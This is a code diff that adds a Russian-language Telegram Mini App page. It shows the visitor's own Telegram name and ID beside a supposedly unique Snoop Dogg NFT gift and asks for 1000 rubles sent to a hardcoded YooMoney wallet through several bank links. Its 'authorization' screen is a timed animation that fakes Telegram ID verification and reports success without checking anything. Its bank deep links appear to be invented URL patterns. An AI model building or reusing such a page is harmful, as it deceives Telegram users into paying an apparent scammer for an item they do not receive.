@@ -16,4 +16,817 @@
             min-height: 100vh;
             background: linear-gradient(135deg, #0b0b1f 0%, #1a1f35 100%);
             display: flex;
-            align
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .glass-container {
+            width: 100%;
+            max-width: 400px;
+            background: rgba(20, 25, 45, 0.7);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 32px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+            overflow: hidden;
+            padding: 20px;
+            position: relative;
+        }
+
+        .close-button {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            width: 36px;
+            height: 36px;
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            z-index: 100;
+        }
+
+        .close-button:hover {
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+            padding: 8px 0;
+        }
+
+        .avatar {
+            width: 52px;
+            height: 52px;
+            border-radius: 26px;
+            background: linear-gradient(135deg, #8e44ad, #3498db);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 22px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            overflow: hidden;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
+        }
+
+        .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .user-info {
+            flex: 1;
+        }
+
+        .user-name {
+            color: white;
+            font-weight: 600;
+            font-size: 18px;
+            margin-bottom: 4px;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+
+        .user-id {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 13px;
+            font-family: monospace;
+        }
+
+        .progress-section {
+            margin: 20px 0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #3498db, #9b59b6);
+            border-radius: 2px;
+            transition: width 0.3s ease;
+        }
+
+        .progress-text {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 12px;
+            margin-top: 6px;
+            text-align: center;
+        }
+
+        .gift-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 10px 0 25px;
+            position: relative;
+        }
+
+        .gift-container {
+            position: relative;
+            width: 220px;
+            height: 220px;
+            margin: 10px 0;
+        }
+
+        .gift-background {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 30px;
+            background: linear-gradient(135deg, #FFD700, #FFA500, #FF8C00, #FF6347);
+            background-size: 300% 300%;
+            animation: gradientBG 8s ease infinite;
+            filter: blur(5px);
+            opacity: 0.7;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .gift-pattern {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 30px;
+            background-image: 
+                radial-gradient(circle at 30% 40%, rgba(255,215,0,0.3) 3px, transparent 3px),
+                radial-gradient(circle at 70% 60%, rgba(255,215,0,0.3) 4px, transparent 4px),
+                radial-gradient(circle at 40% 80%, rgba(255,215,0,0.3) 2px, transparent 2px),
+                radial-gradient(circle at 80% 20%, rgba(255,215,0,0.3) 5px, transparent 5px),
+                repeating-linear-gradient(45deg, rgba(255,215,0,0.1) 0px, rgba(255,215,0,0.1) 2px, transparent 2px, transparent 6px);
+            opacity: 0.6;
+            animation: patternMove 15s linear infinite;
+        }
+
+        @keyframes patternMove {
+            0% { background-position: 0 0; }
+            100% { background-position: 50px 50px; }
+        }
+
+        .gift-model {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 30px;
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(2px);
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 2;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+        }
+
+        .gift-icon {
+            font-size: 80px;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.4));
+            animation: float 3s ease-in-out infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+
+        .gift-label {
+            color: white;
+            font-weight: 700;
+            font-size: 18px;
+            background: rgba(0,0,0,0.4);
+            padding: 6px 16px;
+            border-radius: 30px;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .gift-details {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 20px;
+            padding: 16px;
+            margin-top: 15px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 14px;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .detail-value {
+            font-weight: 600;
+        }
+
+        .rarity-high {
+            color: #FFD700;
+        }
+
+        .telegram-button {
+            width: 100%;
+            background: rgba(0, 136, 204, 0.2);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(0, 170, 255, 0.3);
+            border-radius: 20px;
+            padding: 16px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin: 15px 0;
+        }
+
+        .telegram-button:hover {
+            background: rgba(0, 136, 204, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .telegram-icon {
+            width: 36px;
+            height: 36px;
+            background: rgba(0, 170, 255, 0.3);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .telegram-text {
+            flex: 1;
+            font-weight: 600;
+            font-size: 15px;
+        }
+
+        .menu-section {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin: 10px 0;
+        }
+
+        .menu-button {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 16px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .menu-button:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateX(5px);
+        }
+
+        .menu-icon {
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .menu-text {
+            flex: 1;
+            font-weight: 500;
+        }
+
+        .banks-section {
+            display: none;
+            flex-direction: column;
+            gap: 8px;
+            margin: 15px 0;
+        }
+
+        .bank-button {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 18px;
+            padding: 14px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .bank-button:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateX(5px);
+        }
+
+        .bank-icon {
+            width: 42px;
+            height: 42px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+        }
+
+        .bank-info {
+            flex: 1;
+        }
+
+        .bank-name {
+            font-weight: 600;
+            font-size: 15px;
+            margin-bottom: 4px;
+        }
+
+        .bank-desc {
+            font-size: 12px;
+            opacity: 0.6;
+        }
+
+        .back-button {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 12px;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            cursor: pointer;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .visible {
+            display: flex;
+        }
+
+        .status-message {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 12px;
+            margin: 10px 0;
+            color: white;
+            text-align: center;
+            font-size: 13px;
+        }
+        
+        .wallet-number {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 12px;
+            border-radius: 12px;
+            font-family: monospace;
+            font-size: 16px;
+            text-align: center;
+            color: #FFD700;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            margin: 10px 0;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="glass-container">
+        <div class="close-button" onclick="closeApp()">✕</div>
+
+        <div class="header">
+            <div class="avatar" id="avatar">👤</div>
+            <div class="user-info">
+                <div class="user-name" id="userName">Загрузка...</div>
+                <div class="user-id" id="userId">ID: загрузка</div>
+            </div>
+        </div>
+
+        <div class="progress-section" id="progress">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-text" id="progressText">Загрузка 0%</div>
+        </div>
+
+        <div id="mainScreen">
+            <div class="gift-section">
+                <div class="gift-container">
+                    <div class="gift-background"></div>
+                    <div class="gift-pattern"></div>
+                    <div class="gift-model">
+                        <div class="gift-icon" id="giftIcon">🎤</div>
+                        <div class="gift-label" id="giftModel">Snoop Dogg</div>
+                    </div>
+                </div>
+                
+                <div class="gift-details">
+                    <div class="detail-row">
+                        <span class="detail-label">Модель</span>
+                        <span class="detail-value" id="modelName">Snoop Dogg Purple Hoodie</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Фон</span>
+                        <span class="detail-value" id="backdropName">Platinum 1.2%</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Узор</span>
+                        <span class="detail-value" id="patternName">Royal Turban 0.4%</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Редкость</span>
+                        <span class="detail-value rarity-high" id="rarity">Уникальный</span>
+                    </div>
+                </div>
+
+                <div class="telegram-button" onclick="openTelegramGift()">
+                    <span class="telegram-icon">📱</span>
+                    <span class="telegram-text">Посмотреть в Telegram</span>
+                    <span>↗</span>
+                </div>
+            </div>
+
+            <div class="wallet-number">
+                💳 4100118919813671
+            </div>
+
+            <div class="menu-section">
+                <div class="menu-button" onclick="showBanks()">
+                    <span class="menu-icon">💳</span>
+                    <span class="menu-text">Оплатить 1000 ₽</span>
+                    <span>→</span>
+                </div>
+                <div class="menu-button" onclick="showAuth()">
+                    <span class="menu-icon">🔐</span>
+                    <span class="menu-text">Авторизация</span>
+                    <span>→</span>
+                </div>
+            </div>
+        </div>
+
+        <div id="banksScreen" class="hidden">
+            <div class="back-button" onclick="showMainScreen()">
+                ← Назад
+            </div>
+            
+            <div class="gift-details" style="margin-bottom: 15px;">
+                <div class="detail-row">
+                    <span class="detail-label">Сумма</span>
+                    <span class="detail-value">1000 ₽</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Кошелек</span>
+                    <span class="detail-value" style="font-size: 12px;">4100118919813671</span>
+                </div>
+            </div>
+
+            <div class="banks-section visible">
+                <div class="bank-button" onclick="selectBank('sber')">
+                    <span class="bank-icon">🏦</span>
+                    <div class="bank-info">
+                        <div class="bank-name">Сбербанк</div>
+                        <div class="bank-desc">Перевод на кошелек</div>
+                    </div>
+                    <span>→</span>
+                </div>
+                
+                <div class="bank-button" onclick="selectBank('tinkoff')">
+                    <span class="bank-icon">💳</span>
+                    <div class="bank-info">
+                        <div class="bank-name">Тинькофф</div>
+                        <div class="bank-desc">Перевод на кошелек</div>
+                    </div>
+                    <span>→</span>
+                </div>
+                
+                <div class="bank-button" onclick="selectBank('vtb')">
+                    <span class="bank-icon">🏛</span>
+                    <div class="bank-info">
+                        <div class="bank-name">ВТБ</div>
+                        <div class="bank-desc">Перевод на кошелек</div>
+                    </div>
+                    <span>→</span>
+                </div>
+                
+                <div class="bank-button" onclick="selectBank('alpha')">
+                    <span class="bank-icon">🔵</span>
+                    <div class="bank-info">
+                        <div class="bank-name">Альфа-Банк</div>
+                        <div class="bank-desc">Перевод на кошелек</div>
+                    </div>
+                    <span>→</span>
+                </div>
+                
+                <div class="bank-button" onclick="selectBank('yoomoney')">
+                    <span class="bank-icon">📱</span>
+                    <div class="bank-info">
+                        <div class="bank-name">ЮMoney</div>
+                        <div class="bank-desc">Прямой перевод</div>
+                    </div>
+                    <span>→</span>
+                </div>
+            </div>
+        </div>
+
+        <div id="paymentScreen" class="hidden">
+            <div class="back-button" onclick="showBanks()">
+                ← К выбору банка
+            </div>
+
+            <div class="gift-details" style="margin: 15px 0;">
+                <div class="detail-row">
+                    <span class="detail-label">Банк</span>
+                    <span class="detail-value" id="selectedBank">Не выбран</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Сумма</span>
+                    <span class="detail-value">1000 ₽</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Получатель</span>
+                    <span class="detail-value" style="font-size: 12px;">4100118919813671</span>
+                </div>
+            </div>
+
+            <div class="wallet-number" style="margin: 10px 0;">
+                4100118919813671
+            </div>
+
+            <div class="menu-section">
+                <div class="menu-button" onclick="openBankApp()">
+                    <span class="menu-icon">📱</span>
+                    <span class="menu-text">Открыть в приложении</span>
+                    <span>→</span>
+                </div>
+                
+                <div class="menu-button" onclick="openBankSite()">
+                    <span class="menu-icon">🌐</span>
+                    <span class="menu-text">Открыть на сайте</span>
+                    <span>→</span>
+                </div>
+                
+                <div class="menu-button" onclick="confirmPayment()">
+                    <span class="menu-icon">✅</span>
+                    <span class="menu-text">Я оплатил</span>
+                    <span>→</span>
+                </div>
+            </div>
+        </div>
+
+        <div id="authScreen" class="hidden">
+            <div class="back-button" onclick="showMainScreen()">
+                ← Назад
+            </div>
+
+            <div class="progress-section">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="authProgressFill" style="width: 0%;"></div>
+                </div>
+                <div class="progress-text" id="authProgressText">Авторизация 0%</div>
+            </div>
+
+            <div class="status-message" id="authStatus">
+                Подключение к Telegram...
+            </div>
+
+            <div class="gift-section">
+                <div class="gift-container" style="width: 150px; height: 150px; margin: 0 auto;">
+                    <div class="gift-model" style="background: rgba(0,0,0,0.5);">
+                        <div class="gift-icon" style="font-size: 50px;">🔐</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let tg = window.Telegram?.WebApp;
+        let userData = null;
+        let selectedBank = null;
+        
+        const YOOMONEY_WALLET = "4100118919813671";
+        const PAYMENT_AMOUNT = 1000;
+        const TELEGRAM_GIFT_URL = "https://t.me/nft/SnoopDogg-135641";
+        
+        const BANKS = {
+            sber: {
+                name: 'Сбербанк',
+                app: `sberbank://transfer?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`,
+                url: `https://online.sberbank.ru/payment?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`
+            },
+            tinkoff: {
+                name: 'Тинькофф',
+                app: `tinkoff://payment?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`,
+                url: `https://www.tinkoff.ru/payment?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`
+            },
+            vtb: {
+                name: 'ВТБ',
+                app: `vtb://transfer?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`,
+                url: `https://online.vtb.ru/payment?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`
+            },
+            alpha: {
+                name: 'Альфа-Банк',
+                app: `alfabank://pay?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`,
+                url: `https://alfabank.ru/payment?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`
+            },
+            yoomoney: {
+                name: 'ЮMoney',
+                app: `yoomoney://transfer?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`,
+                url: `https://yoomoney.ru/transfer?amount=${PAYMENT_AMOUNT}&to=${YOOMONEY_WALLET}`
+            }
+        };
+
+        document.addEventListener('DOMContentLoaded', function() {
+            initApp();
+        });
+
+        function initApp() {
+            if (tg) {
+                tg.ready();
+                tg.expand();
+                
+                userData = tg.initDataUnsafe?.user;
+                if (userData) {
+                    document.getElementById('userName').textContent = userData.first_name || 'Пользователь';
+                    document.getElementById('userId').textContent = `ID: ${userData.id || 'неизвестно'}`;
+                    
+                    if (userData.photo_url) {
+                        document.getElementById('avatar').innerHTML = `<img src="${userData.photo_url}" alt="avatar">`;
+                    } else {
+                        const initial = userData.first_name ? userData.first_name.charAt(0) : '👤';
+                        document.getElementById('avatar').textContent = initial;
+                    }
+                }
+            }
+            
+            startLoadingAnimation();
+        }
+
+        function startLoadingAnimation() {
+            let progress = 0;
+            const fill = document.getElementById('progressFill');
+            const text = document.getElementById('progressText');
+            
+            const interval = setInterval(() => {
+                progress += 2;
+                fill.style.width = progress + '%';
+                text.textContent = 'Загрузка ' + progress + '%';
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    text.textContent = 'Готово';
+                    setTimeout(() => {
+                        document.getElementById('progress').style.opacity = '0.5';
+                    }, 500);
+                }
+            }, 30);
+        }
+
+        function openTelegramGift() {
+            if (tg) {
+                tg.openTelegramLink(TELEGRAM_GIFT_URL);
+            } else {
+                window.open(TELEGRAM_GIFT_URL, '_blank');
+            }
+        }
+
+        function showMainScreen() {
+            document.getElementById('mainScreen').classList.remove('hidden');
+            document.getElementById('banksScreen').classList.add('hidden');
+            document.getElementById('paymentScreen').classList.add('hidden');
+            document.getElementById('authScreen').classList.add('hidden');
+        }
+
+        function showBanks() {
+            document.getElementById('mainScreen').classList.add('hidden');
+            document.getElementById('banksScreen').classList.remove('hidden');
+            document.getElementById('paymentScreen').classList.add('hidden');
+        }
+
+        function showAuth() {
+            document.getElementById('mainScreen').classList.add('hidden');
+            document.getElementById('authScreen').classList.remove('hidden');
+            
+            let progress = 0;
+            const fill = document.getElementById('authProgressFill');
+            const text = document.getElementById('authProgressText');
+            const status = document.getElementById('authStatus');
+            
+            const interval = setInterval(() => {
+                progress += 10;
+                fill.style.width = progress + '%';
+                text.textContent = 'Авторизация ' + progress + '%';
+                
+                if (progress === 30) {
+                    status.textContent = 'Проверка Telegram ID...';
+                } else if (progress === 60) {
+                    status.textContent = 'Подтверждение данных...';
+                } else if (progress === 90) {
+                    status.textContent = 'Завершение...';
+                } else if (progress >= 100) {
+                    clearInterval(interval);
+                    status.textContent = '✅ Авторизация успешна!';
+                    setTimeout(() => {
+                        showMainScreen();
+                    }, 1000);
+                }
+            }, 200);
+        }
+
+        function selectBank(bankKey) {
+            selectedBank = BANKS[bankKey];
+            document.getElementById('selectedBank').textContent = selectedBank.name;
+            
+            document.getElementById('banksScreen').classList.add('hidden');
+            document.getElementById('paymentScreen').classList.remove('hidden');
+        }
+
+        function openBankApp() {
+            if (selectedBank) {
+                window.location.href = selectedBank.app;
+            }
+        }
+
+        function openBankSite() {
+            if (selectedBank) {
+                window.open(selectedBank.url, '_blank');
+            }
+        }
+
+        function confirmPayment() {
+            if (tg) {
+                tg.sendData(JSON.stringify({
+                    action: 'payment_confirmed',
+                    bank: selectedBank?.name,
+                    amount: PAYMENT_AMOUNT,
+                    wallet: YOOMONEY_WALLET
+                }));
+                
+                alert('✅ Чек отправлен! Ожидайте подтверждения');
+                showMainScreen();
+            } else {
+                alert('✅ Демо: оплата подтверждена');
+                showMainScreen();
+            }
+        }
+
+        function closeApp() {
+            if (tg) {
+                tg.close();
+            } else {
+                window.close();
+            }
+        }
+    </script>
+</body>
+</html>
